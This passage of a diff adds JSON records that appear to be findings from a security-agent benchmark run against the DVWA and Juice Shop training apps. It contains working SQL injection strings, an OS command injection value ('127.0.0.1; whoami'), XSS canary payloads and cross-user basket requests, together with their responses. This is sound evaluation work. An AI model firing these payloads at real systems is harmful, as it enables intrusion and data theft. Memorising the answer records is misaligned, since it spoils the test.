+    "response_evidence": "POST returned HTTP 200 and the guestbook persisted the entry (Name: xss). Canary is 50 characters, matching the mtxMessage maxlength. Rendering page loaded in dvwa_admin browser session (HTTP 200). Note: the text-only DOM summary omits the script body, so the stored payload was not visible as text; execution was determined by the JS check below.",
+    "browser_js_evidence": "browser_eval_js(\"window.xss_flag\") on http://dvwa/vulnerabilities/xss_s/ returned 1 (result: 1)."
+  },
+  {
+    "blind_id": "BLIND-0034",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/sqli/",
+    "method": "GET",
+    "parameter": "id",
+    "cwe": "CWE-89",
+    "title": "SQL Injection in DVWA SQL Injection form (id parameter)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://dvwa/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit (session dvwa_admin)",
+      "GET http://dvwa/vulnerabilities/sqli/?id=1' AND '1'='2&Submit=Submit (session dvwa_admin)"
+    ],
+    "response_evidence": "TRUE condition (id=1' OR '1'='1): 5 records returned: \"ID: 1' OR '1'='1 First name: admin Surname: admin\", \"First name: Gordon Surname: Brown\", \"First name: Hack Surname: Me\", \"First name: Pablo Surname: Picasso\", \"First name: Bob Surname: Smith\". FALSE condition (id=1' AND '1'='2): HTML contains \"User ID:\" with zero \"First name:\"/\"Surname:\" records. SQLi DB: mysql. Differential TRUE=multiple records vs FALSE=zero records confirms SQL injection.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0035",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/api/Feedbacks/",
+    "method": "POST",
+    "parameter": "comment",
+    "cwe": "CWE-79",
+    "title": "Stored XSS via feedback comment canary not executed",
+    "agent_verdict": "rejected",
+    "request_sequence": [
+      "POST http://juiceshop:3000/api/Feedbacks/ {\"comment\":\"<script id=\\\"test_token\\\">window.xss_flag=1</script>\",\"rating\":1} (unauth) -> 500 captchaId undefined",
+      "GET http://juiceshop:3000/rest/captcha/ (unauth) -> {captchaId:0, captcha:'2+8*10', answer:'82'}",
+      "POST http://juiceshop:3000/api/Feedbacks/ {\"comment\":\"<canary>\",\"rating\":1,\"captchaId\":0,\"captcha\":\"82\",\"UserId\":null} (unauth) -> 201 id 9",
+      "browser_navigate http://juiceshop:3000/#/about (unauth) then browser_eval_js('window.xss_flag')"
+    ],
+    "response_evidence": "POST with canary returned 201 {\"status\":\"success\",\"data\":{\"id\":9,\"comment\":\"\",\"rating\":1,\"UserId\":null}}. The stored comment is an empty string: the canary's <script> payload was stripped by server-side sanitization on save, so no script is persisted. Browser eval on the rendering page returned window.xss_flag = null (not 1). Stored XSS not confirmed.",
+    "browser_js_evidence": "browser_eval_js(\"window.xss_flag\") -> {\"current_url\":\"http://juiceshop:3000/#/about\",\"result\":null}"
+  },
+  {
+    "blind_id": "BLIND-0036",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/sqli_blind/",
+    "method": "GET",
+    "parameter": "id",
+    "cwe": "CWE-89",
+    "title": "Blind SQL injection in id parameter (sqli_blind) - boolean differential observed but names/surnames not retrievable",
+    "agent_verdict": "inconclusive",
+    "request_sequence": [
+      "GET http://dvwa/vulnerabilities/sqli_blind/?id=1' OR '1'='1&Submit=Submit (session dvwa_admin)",
+      "GET http://dvwa/vulnerabilities/sqli_blind/?id=1' AND '1'='2&Submit=Submit (session dvwa_admin)"
+    ],
+    "response_evidence": "TRUE condition (1' OR '1'='1): HTTP 200, body 'User ID exists in the database.' (pre_block). FALSE condition (1' AND '1'='2): HTTP 404, body 'User ID is MISSING from the database.' The TRUE/FALSE differential is present, but the page only reports existence and returns no user records, names, or surnames. The 'Username: admin' text is the logged-in session user, not injected data. The confirmation criterion (multiple seeded user records with names/surnames for TRUE) cannot be met, so the verdict is inconclusive rather than confirmed.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0037",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/ftp/",
+    "method": "GET",
+    "parameter": "Accept: text/html,application/json",
+    "cwe": "CWE-200",
+    "title": "Open directory listing at /ftp/ exposes confidential files to unauthenticated users",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/ftp/ (session=unauth, Accept: text/html,application/json)"
+    ],
+    "response_evidence": "HTTP 200 text/html. Visible text: \"listing directory /ftp/ ~ / ftp / quarantine ... acquisitions.md 909 ... incident-support.kdbx 3246 ... legal.md 3047 ... package.json.bak 4291 ... suspicious_errors.yml 723\". The listing reveals acquisitions.md unauthenticated. Per coordinator, direct retrieval of acquisitions.md was already confirmed in a prior finding and was not re-verified here. Budget after check: HTTP 157 remaining.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0038",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/api/Feedbacks/",
+    "method": "GET",
+    "parameter": "",
+    "cwe": "CWE-200",
+    "title": "Unauthenticated disclosure of all user feedback records including other users' UserIds and partially masked emails",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/api/Feedbacks/  (session=unauth, no credentials)"
+    ],
+    "response_evidence": "HTTP 200 unauthenticated, {\"status\":\"success\",\"data\":[...]} with 8 feedback records (ids 1-8). Fields returned: UserId, id, comment, rating, createdAt, updatedAt. Sample: {\"UserId\":1,\"id\":1,\"comment\":\"I love this shop! ... (***in@juice-sh.op)\",\"rating\":5}; {\"UserId\":21,\"id\":4,\"comment\":\"Please send me the juicy chatbot NFT in my wallet at /juicy-nft : \\\"purpose betray marriage blame crunch monitor spin slide donate sport lift clutch\\\" (***ereum@juice-sh.op)\",\"rating\":1}; {\"UserId\":null,\"id\":5,...,\"(anonymous)\"}. Records 1-4 are attributed to other registered users (UserId 1, 2, 3, 21) with user email fragments in comments, and are returned without any authentication. Count: 8.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0039",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/ftp/acquisitions.md",
+    "method": "GET",
+    "parameter": "path",
+    "cwe": "CWE-200",
+    "title": "Confidential acquisitions memo exposed via open /ftp/ directory listing",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET /ftp/ (unauth, Accept: text/html,application/json) - listing shows acquisitions.md",
+      "GET /ftp/acquisitions.md (unauth)"
+    ],
+    "response_evidence": "Directory listing exposes acquisitions.md (909 bytes). Direct GET returned 200 text/markdown: '# Planned Acquisitions > This document is confidential! Do not distribute! Our company plans to acquire several competitors within the next year. This will have a significant stock market impact...'",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0040",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/sqli/",
+    "method": "GET",
+    "parameter": "id",
+    "cwe": "CWE-89",
+    "title": "SQL Injection in User ID lookup (sqli, Low security)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET /vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit (dvwa_admin)",
+      "GET /vulnerabilities/sqli/?id=1' AND '1'='2&Submit=Submit (dvwa_admin)"
+    ],
+    "response_evidence": "TRUE condition returned 5 user records: admin/admin, Gordon/Brown, Hack/Me, Pablo/Picasso, Bob/Smith. FALSE condition returned zero records (no 'First name' rows rendered).",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0041",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/exec/",
+    "method": "POST",
+    "parameter": "ip",
+    "cwe": "CWE-78",
+    "title": "OS Command Injection in DVWA Ping form (Low)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST /vulnerabilities/exec/ ip=127.0.0.1; whoami&Submit=Submit (dvwa_admin)"
+    ],
+    "response_evidence": "Ping output followed by 'www-data' line after the ping statistics, confirming injected whoami executed as the web process user www-data.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0042",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/rest/basket/6",
+    "method": "GET",
+    "parameter": "id (path)",
+    "cwe": "CWE-639",
+    "title": "Cross-user basket access (BOLA) on /rest/basket/{id}: acct2 reads acct1's basket 6",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/rest/basket/6 (juiceshop_acct1; session_info.own_basket_id=6, email acct1_bench@juiceshop.local)",
+      "GET http://juiceshop:3000/rest/basket/6 (juiceshop_acct2; session_info.own_basket_id=7, email acct2_bench@juiceshop.local)"
+    ],
+    "response_evidence": "acct1 own basket 6: {\"status\":\"success\",\"data\":{\"id\":6,\"UserId\":22,\"Products\":[{\"id\":1,\"name\":\"Apple Juice (1000ml)\",\"BasketItem\":{\"ProductId\":1,\"BasketId\":6,\"id\":9,\"quantity\":3}}]}}. acct2 (own basket 7) GET /rest/basket/6 returned HTTP 200 with the identical body: id 6, UserId 22, Products: Apple Juice (1000ml), quantity 3.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0043",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/exec/",
+    "method": "POST",
+    "parameter": "ip",
+    "cwe": "CWE-78",
+    "title": "OS Command Injection in DVWA ping form (ip parameter)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST /vulnerabilities/exec/ ip=127.0.0.1; whoami&Submit=Submit (dvwa_admin)"
+    ],
+    "response_evidence": "Response contains ping output for 127.0.0.1 followed by the line 'www-data', the web-process identity from injected 'whoami'.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0044",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/exec/",
+    "method": "POST",
+    "parameter": "ip",
+    "cwe": "CWE-78",
+    "title": "OS Command Injection in ping utility (exec, Low security)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST /vulnerabilities/exec/ ip=127.0.0.1; whoami&Submit=Submit (dvwa_admin)"
+    ],
+    "response_evidence": "Ping output followed by the line 'www-data', confirming command execution as the web process user.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0045",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/xss_s/",
+    "method": "POST",
+    "parameter": "mtxMessage",
+    "cwe": "CWE-79",
+    "title": "Stored XSS in DVWA guestbook (xss_s) via mtxMessage",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://dvwa/vulnerabilities/xss_s/ (session dvwa_admin) form: txtName=tester, mtxMessage=<script id=\"test_token\">window.xss_flag=1</script> (50 chars), btnSign=Sign Guestbook -> 200",
+      "browser_navigate http://dvwa/vulnerabilities/xss_s/ (session dvwa_admin)",
+      "browser_eval_js window.xss_flag"
+    ],
+    "response_evidence": "POST response (200) lists stored entry 'Name: tester / Message:' with the script payload rendered as an element rather than displayed text. Rendered DOM shows 'Name: tester Message:' with empty message text, consistent with script execution. Canary is exactly 50 characters and was accepted by maxlength=50.",
+    "browser_js_evidence": "browser_eval_js(\"window.xss_flag\") -> 1 (current_url http://dvwa/vulnerabilities/xss_s/)"
+  },
+  {
+    "blind_id": "BLIND-0046",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/ftp/",
+    "method": "GET",
+    "parameter": "",
+    "cwe": "CWE-200",
+    "title": "Open directory listing at /ftp/ exposes confidential acquisitions.md",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/ftp/ with Accept: text/html,application/json (session=unauth) -> 200",
+      "GET http://juiceshop:3000/ftp/acquisitions.md (session=unauth) -> 200"
+    ],
+    "response_evidence": "Listing (unauth, 200 text/html): 'listing directory /ftp/ ... acquisitions.md 909 ... announcement_encrypted.md ... coupons_2013.md.bak ... incident-support.kdbx ... legal.md ...' — the document is listed and linked. Only the listing itself is the exposure vector; no authentication required.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0047",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/rest/basket/6",
+    "method": "GET",
+    "parameter": "id",
+    "cwe": "CWE-639",
+    "title": "BOLA: juiceshop_acct2 reads juiceshop_acct1 basket via /rest/basket/:id",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/rest/basket/6 (session juiceshop_acct1) -> 200, own_basket_id=6",
+      "GET http://juiceshop:3000/rest/basket/6 (session juiceshop_acct2; acct2 own_basket_id=7) -> 200"
+    ],
+    "response_evidence": "acct1 own basket 6 (UserId 22): Products [Apple Juice (1000ml), quantity 3]. acct2 request for basket 6 returned status success with data.id=6, UserId 22, Products [{name: \"Apple Juice (1000ml)\", BasketItem quantity: 3, BasketId: 6}]. Account 2 (own basket 7) retrieved Account 1's basket items. Note: the earlier basket 1 observation was not re-tested here; the confirmation rests on basket 6.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0048",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/rest/basket/{id}",
+    "method": "GET",
+    "parameter": "id (path)",
+    "cwe": "CWE-639",
+    "title": "Cross-user basket access (BOLA) on GET /rest/basket/{id}",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/rest/basket/6 (session=juiceshop_acct1) -> 200",
+      "GET http://juiceshop:3000/rest/basket/6 (session=juiceshop_acct2, own_basket_id=7) -> 200"
+    ],
+    "response_evidence": "acct1 own basket 6: {\"status\":\"success\",\"data\":{\"id\":6,\"UserId\":22,\"Products\":[{\"name\":\"Apple Juice (1000ml)\",\"BasketItem\":{\"ProductId\":1,\"BasketId\":6,\"id\":9,\"quantity\":3}}]}}. acct2 (own_basket_id=7) requesting /rest/basket/6 received the identical body: id 6, UserId 22, Apple Juice (1000ml) quantity 3. acct2 is not the owner (its own basket is 7), so acct1's basket contents were disclosed cross-user.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0049",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/rest/products/search",
+    "method": "GET",
+    "parameter": "q",
+    "cwe": "CWE-89",
+    "title": "SQL injection in product search q parameter (Boolean-based)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET /rest/products/search?q=' OR 1=1))-- (unauth) -> 200 JSON status=success, data array of many products",
+      "GET /rest/products/search?q=' AND 1=2))-- (unauth) -> 200 {\"status\":\"success\",\"data\":[]}",
+      "(Initial attempts GET q=' OR 1=1-- and q=' AND 1=2-- returned 500 SQLITE_ERROR 'incomplete input' because the unbalanced parentheses in the server query were not closed; the balanced payloads above were used instead.)"
+    ],
+    "response_evidence": "TRUE condition q=' OR 1=1))-- returned HTTP 200 with multiple product records, e.g. {\"id\":1,\"name\":\"Apple Juice (1000ml)\"},{\"id\":2,\"name\":\"Orange Juice (1000ml)\"},{\"id\":3,\"name\":\"Eggfruit Juice (500ml)\"},{\"id\":4,\"name\":\"Raspberry Juice (1000ml)\"},{\"id\":5,\"name\":\"Lemon Juice (500ml)\"},{\"id\":6,\"name\":\"Banana Juice (1000ml)\"},{\"id\":7,\"name\":\"OWASP Juice Shop T-Shirt\"}... (response excerpt truncated; includes at least 10 products, including deletedAt-flagged item id 10). FALSE condition q=' AND 1=2))-- returned HTTP 200 body {\"status\":\"success\",\"data\":[]} (zero records). TRUE returns multiple records while FALSE returns zero, meeting the Boolean SQLi criterion.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0050",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/ftp/",
+    "method": "GET",
+    "parameter": "",
+    "cwe": "CWE-200",
+    "title": "Open directory listing at /ftp/ exposes confidential acquisitions memo",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/ftp/ (session unauth, Accept: text/html,application/json)",
+      "GET http://juiceshop:3000/ftp/acquisitions.md (session unauth)"
+    ],
+    "response_evidence": "Listing HTTP 200 text/html: visible_text 'listing directory /ftp/ ... acquisitions.md 909 ... announcement_encrypted.md ... incident-support.kdbx ... legal.md ...'. Direct fetch HTTP 200 text/markdown: '# Planned Acquisitions > This document is confidential! Do not distribute! Our company plans to acquire several competitors within the next year. This will have a significant stock market impact...'",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0051",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/rest/basket/6",
+    "method": "GET",
+    "parameter": "id",
+    "cwe": "CWE-639",
+    "title": "Cross-user basket access (BOLA) on /rest/basket/:id",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET /rest/basket/6 (juiceshop_acct1) - own basket, owner UserId 22, own_basket_id 6",
+      "GET /rest/basket/6 (juiceshop_acct2) - session own_basket_id 7"
+    ],
+    "response_evidence": "Account 2 (acct2_bench) retrieved Account 1's basket id 6 (UserId 22) containing Apple Juice (1000ml) with BasketItem quantity 3, identical to Account 1's own view.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0052",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/exec/",
+    "method": "POST",
+    "parameter": "ip",
+    "cwe": "CWE-78",
+    "title": "OS Command Injection via ip parameter at /vulnerabilities/exec/",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://dvwa/vulnerabilities/exec/ form ip='127.0.0.1; whoami', Submit='Submit' (session dvwa_admin, Low)"
+    ],
+    "response_evidence": "HTTP 200. Ping output for 127.0.0.1 (4 packets, 0% loss) followed by a standalone line 'www-data' immediately before 'More Information'. The 'www-data' line is the output of the injected whoami command, identifying the web-process user.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0053",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/exec/",
+    "method": "POST",
+    "parameter": "ip",
+    "cwe": "CWE-78",
+    "title": "OS Command Injection in DVWA ping form (ip parameter, Low security)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST /vulnerabilities/exec/ ip=127.0.0.1; whoami&Submit=Submit (dvwa_admin)"
+    ],
+    "response_evidence": "Response output contains ping statistics followed by the line 'www-data', showing the injected whoami command executed as the web process user.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0054",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/rest/basket/6",
+    "method": "GET",
+    "parameter": "id",
+    "cwe": "CWE-639",
+    "title": "Cross-user basket access (BOLA) on /rest/basket/:id in Juice Shop",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET /rest/basket/6 (juiceshop_acct1; own_basket_id=6)",
+      "GET /rest/basket/6 (juiceshop_acct2; own_basket_id=7)"
+    ],
+    "response_evidence": "Account 2 received Account 1's basket (UserId 22, basket id 6) containing product 'Apple Juice (1000ml)' with BasketItem quantity 3, identical to Account 1's own view.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0055",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/rest/products/search",
+    "method": "GET",
+    "parameter": "q",
+    "cwe": "CWE-89",
+    "title": "SQL injection in product search parameter q",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/rest/products/search?q=' OR 1=1-- (unauth) -> 500 SQLITE_ERROR: incomplete input (unbalanced parentheses in base query)",
+      "GET http://juiceshop:3000/rest/products/search?q=' AND 1=2-- (unauth) -> 500 SQLITE_ERROR: incomplete input",
+      "GET http://juiceshop:3000/rest/products/search?q=')) OR 1=1-- (unauth, TRUE) -> 200 status success, multiple records",
+      "GET http://juiceshop:3000/rest/products/search?q=')) AND 1=2-- (unauth, FALSE) -> 200 {\"status\":\"success\",\"data\":[]}"
+    ],
+    "response_evidence": "TRUE condition q=')) OR 1=1--: HTTP 200, {\"status\":\"success\",\"data\":[{\"id\":1,\"name\":\"Apple Juice (1000ml)\",...},{\"id\":2,\"name\":\"Orange Juice (1000ml)\",...},{\"id\":3,\"name\":\"Eggfruit Juice (500ml)\",...},{\"id\":4,\"name\":\"Raspberry Juice (1000ml)\",...},{\"id\":5,\"name\":\"Lemon Juice (500ml)\",...},{\"id\":6,\"name\":\"Banana Juice (1000ml)\",...},{\"id\":7,\"name\":\"OWASP Juice Shop T-Shirt\",...},{\"id\":8,\"name\":\"OWASP Juice Shop CTF Girlie-Shirt\",...},{\"id\":9,\"name\":\"OWASP SSL Advanced Forensic Tool (O-Saft)\",...},{\"id\":10,\"name\":\"Christmas Super-Surprise-Box (2014 Edition)\",...}, ...] (full unfiltered catalog, including records with deletedAt set, i.e. rows normally hidden). FALSE condition q=')) AND 1=2--: HTTP 200, {\"status\":\"success\",\"data\":[]} (zero records). Injected boolean condition alone controls result set cardinality (full catalog vs zero). Bare-quote payloads ' OR 1=1-- and ' AND 1=2-- produce SQLite syntax errors (500), consistent with injection into the SQL string. Verified with unauthenticated session.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0056",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/xss_r/",
+    "method": "GET",
+    "parameter": "name",
+    "cwe": "CWE-79",
+    "title": "Reflected XSS in name parameter (xss_r) - canary executes in browser",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://dvwa/vulnerabilities/xss_r/?name=%3Cscript+id%3D%22test_token%22%3Ewindow.xss_flag%3D1%3C%2Fscript%3E (session dvwa_admin)",
+      "browser_navigate http://dvwa/vulnerabilities/xss_r/?name=%3Cscript+id%3D%22test_token%22%3Ewindow.xss_flag%3D1%3C%2Fscript%3E (session dvwa_admin)",
+      "browser_eval_js window.xss_flag"
+    ],
+    "response_evidence": "HTTP 200 from xss_r with the canary reflected unencoded into the page. Browser DOM contains the raw element <script id=\"test_token\">window.xss_flag=1</script> in document.body.innerHTML.",
+    "browser_js_evidence": "browser_eval_js result: {\"flag\":1,\"scriptTags\":[\"<script id=\\\"test_token\\\">window.xss_flag=1</script>\"],\"bodyHasRaw\":\"raw\"} -> window.xss_flag === 1"
+  },
+  {
+    "blind_id": "BLIND-0057",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/api/Users",
+    "method": "GET",
+    "parameter": "",
+    "cwe": "CWE-200",
+    "title": "User records endpoint /api/Users requires authentication (unauth access denied)",
+    "agent_verdict": "rejected",
+    "request_sequence": [
+      "GET /api/Users (session unauth, no Authorization header) -> 401"
+    ],
+    "response_evidence": "HTTP 401, body: \"UnauthorizedError: No Authorization header was found\". No user records were returned to the unauthenticated session, so the public-exposure criterion is not met. Authenticated access was not tested because the assignment scoped this check to unauth.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0058",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/ftp/",
+    "method": "GET",
+    "parameter": "",
+    "cwe": "CWE-200",
+    "title": "Public exposure of confidential acquisitions memo via open /ftp/ directory listing",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/ftp/ with Accept: text/html,application/json (session unauth)",
+      "GET http://juiceshop:3000/ftp/acquisitions.md (session unauth)"
+    ],
+    "response_evidence": "Listing at /ftp/ (HTTP 200, unauth) shows \"acquisitions.md 909\" among files (also quarantine, announcement_encrypted.md, coupons_2013.md.bak, eastere.gg, encrypt.pyc, incident-support.kdbx, legal.md, package.json.bak, suspicious_errors.yml). Direct GET /ftp/acquisitions.md returned HTTP 200, content_type text/markdown, body: \"# Planned Acquisitions\\n\\n> This document is confidential! Do not distribute!\\n\\nOur company plans to acquire several competitors within the next year. This will have a significant stock market impact...\"",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0059",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/rest/admin/application-configuration",
+    "method": "GET",
+    "parameter": "",
+    "cwe": "CWE-200",
+    "title": "Unauthenticated access to admin application configuration exposes server and integration settings",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/rest/admin/application-configuration (session=unauth, no credentials)"
+    ],
+    "response_evidence": "HTTP 200 application/json without authentication. body_excerpt: {\"config\":{\"server\":{\"port\":3000,\"basePath\":\"\"},\"application\":{\"domain\":\"juice-sh.op\",\"name\":\"OWASP Juice Shop\",...,\"localBackupEnabled\":true,\"numberOfRandomFakeUsers\":0,...,\"privacyContactEmail\":\"donotreply@owasp-juice.shop\",\"customMetricsPrefix\":\"juiceshop\",...},\"chatBot\":{...},\"social\":{...},\"googleOauth\":{\"clientId\":\"1005568560502-6hm16lef8oh46hr2d98vf2ohlnj4nfhq.apps.googleusercontent.com\",\"authorizedRedirects\":[{\"uri\":\"https://demo.owasp-juice.shop\"},...,{\"uri\":\"http://localhost:3000\",\"proxy\":\"https://local3000.owasp-juice.shop\"},...]},\"securityTxt\":{...}}. Administrative configuration, including the OAuth client ID, authorized redirect URIs, and internal server and feature flags, is returned to an anonymous caller.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0060",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/ftp/acquisitions.md",
+    "method": "GET",
+    "parameter": "",
+    "cwe": "CWE-200",
+    "title": "Public exposure of confidential acquisition memo via /ftp/ directory",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/ftp/acquisitions.md (session unauth)"
+    ],
+    "response_evidence": "HTTP 200, content_type text/markdown. Body excerpt: '# Planned Acquisitions\\n\\n> This document is confidential! Do not distribute!\\n\\nOur company plans to acquire several competitors within the next year. This will have a significant stock market impact...'. Confidential acquisition memo retrieved without authentication.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0061",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/rest/user/whoami",
+    "method": "GET",
+    "parameter": "",
+    "cwe": "CWE-200",
+    "title": "/rest/user/whoami over-disclosure check (authenticated acct1)",
+    "agent_verdict": "rejected",
+    "request_sequence": [
+      "GET http://juiceshop:3000/rest/user/whoami (session=juiceshop_acct1)"
+    ],
+    "response_evidence": "HTTP 200 application/json; body_excerpt: {\"user\":{}}. The response contains no email, id, role, or token fields, so no sensitive data beyond the caller's own context is disclosed. Harness session_info confirms the session is acct1_bench@juiceshop.local with own_basket_id=6. Not a CWE-200 exposure.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0062",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/ftp/acquisitions.md",
+    "method": "GET",
+    "parameter": "",
+    "cwe": "CWE-200",
+    "title": "Confidential acquisitions memo exposed via open directory listing at /ftp/",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/ftp/ with Accept: text/html,application/json (session unauth) - listing includes acquisitions.md (909 B)",
+      "GET http://juiceshop:3000/ftp/acquisitions.md (session unauth)"
+    ],
+    "response_evidence": "Directory listing at /ftp/ (unauthenticated) shows acquisitions.md 909 bytes. Direct GET /ftp/acquisitions.md returned HTTP 200, content_type text/markdown. Excerpt: \"# Planned Acquisitions > This document is confidential! Do not distribute! Our company plans to acquire several competitors within the next year. This will have a significant stock market impact as we will elaborate in detail in the following paragraph...\"",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0063",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/exec/",
+    "method": "POST",
+    "parameter": "ip",
+    "cwe": "CWE-78",
+    "title": "OS Command Injection in DVWA Command Injection ping form (ip parameter)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://dvwa/vulnerabilities/exec/ (session dvwa_admin) form_data: ip='127.0.0.1; whoami', Submit='Submit'"
+    ],
+    "response_evidence": "HTTP 200. Ping output for 127.0.0.1 followed by the injected command output line: 'www-data' (appears after 'rtt min/avg/max/mdev = 0.020/0.023/0.030/0.004 ms', before 'More Information'). The web-process identity www-data is returned in the response.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0064",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/sqli/",
+    "method": "GET",
+    "parameter": "id",
+    "cwe": "CWE-89",
+    "title": "SQL Injection in DVWA SQLi User ID parameter (Low)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET /vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit (dvwa_admin)",
+      "GET /vulnerabilities/sqli/?id=1' AND '1'='2&Submit=Submit (dvwa_admin)"
+    ],
+    "response_evidence": "TRUE condition returned 5 user records: admin/admin, Gordon/Brown, Hack/Me, Pablo/Picasso, Bob/Smith. FALSE condition returned zero records (no First name/Surname rows).",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0065",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/rest/basket/6",
+    "method": "GET",
+    "parameter": "id",
+    "cwe": "CWE-639",
+    "title": "Cross-user basket access (BOLA) on /rest/basket/:id",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET /rest/basket/6 (juiceshop_acct1, own basket)",
+      "GET /rest/basket/6 (juiceshop_acct2, acct2 own basket is 7)"
+    ],
+    "response_evidence": "juiceshop_acct2 retrieved acct1's basket 6 (UserId 22) containing 'Apple Juice (1000ml)' quantity 3 (BasketItem id 9), identical to acct1's own view.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0066",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/xss_s/",
+    "method": "POST",
+    "parameter": "mtxMessage",
+    "cwe": "CWE-79",
+    "title": "Stored XSS in DVWA guestbook (mtxMessage)",
+    "agent_verdict": "confirmed",
